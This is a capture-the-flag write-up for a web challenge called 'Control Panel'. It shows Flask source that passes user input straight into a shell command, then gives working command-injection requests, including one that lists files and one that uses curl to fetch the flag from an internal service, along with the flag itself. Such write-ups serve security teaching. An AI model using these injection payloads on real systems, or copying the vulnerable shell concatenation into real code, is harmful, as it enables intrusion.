Control Panel

Point count: 150pts

Provided files: control-panel.zip

Description: Agent, we've identified what appears to be ARIA's control panel. Luckily there's no authentication required to interact with it. Can you take down ARIA once and for all?

We are presented with a website with source code. Let's examine the main.py file

```
from flask import Flask, render_template, request
from subprocess import getoutput

app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
    command = request.args.get("command")
    if not command:
        return render_template("index.html")
    
    arg = request.args.get("arg")
    if not arg:
        arg = ""

    if command == "list_processes":
        return getoutput("ps")
    elif command == "list_connections":
        return getoutput("netstat -tulpn")
    elif command == "list_storage":
        return getoutput("df -h")
    elif command == "destroy_humans":
        return getoutput("/www/destroy_humans.sh " + arg)
    
    return render_template("index.html")
```

From this, we can see command injection within the second to last line
`return getoutput("/www/destroy_humans.sh " + arg)`


*Command injection: occurs when an application passes unsafe user-supplied data to a system shell*

In this case, the arg variable can be modified to allow shell commands to be ran on the website

We can test this by opening up burpsuite and passing this header:

`GET /?command=destroy_humans&arg=; ls HTTP/1.1`

And it works! We are able to see the system files inside!

But where is the flag? If we examine the source code further, there is a file called destroyer.py

```
#!/usr/bin/env python3
import subprocess, json
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer

def get_json(content):
	return json.dumps(content).encode()

def http_server(host_port,content_type="application/json"):
	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			def resp_ok():
				self.send_response(200)
				self.send_header("Content-type", content_type)
				self.end_headers()
			if self.path == '/status':
				resp_ok()
				self.wfile.write(get_json({'status': 'ready to destroy'}))
				return
			elif self.path == "/destroy":
				resp_ok()
				self.wfile.write(get_json({'status': "destruction complete!"}))
				return
			elif self.path == '/shutdown':
				resp_ok()
				self.wfile.write(get_json({'status': 'shutting down...'}))
				self.wfile.write(get_json({'status': 'SIVBGR{no-flag-4-u}'}))
				return
			self.send_error(404, '404 not found')
		def log_message(self, format, *args):
			pass
	class _TCPServer(TCPServer):
		allow_reuse_address = True
	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()

http_server(('127.0.0.1',3000))
```

The file states that the endpoint `/shutdown` will reply with a json reply of the flag

But how can we grab it? Simply visiting /shutdown via a browser will return a 404 not found.

We can use curl! Since we have command injection, if we pass curl and curl the endpoint from the server's perspective, we can grab the flag

So, your command should look something like this

`GET /?command=destroy_humans&arg=;%20curl%20-s%20localhost:3000/shutdown HTTP/1.1`

*Note: -s was supplied to prevent the server from replying with the download bar that curl usually outputs.*

We need to supply url encoding inside of burpsuite. %20 represents a space.

Once ran, we get the flag!

Final flag: `SIVBGR{g00dby3_ARI4}`

Final command injection exploit:

![image](https://github.com/sa1181405/pbchocolate-private-writeup-making/assets/170969470/c9d3b0c1-67f2-4da6-ba03-23ede1e31dd4)



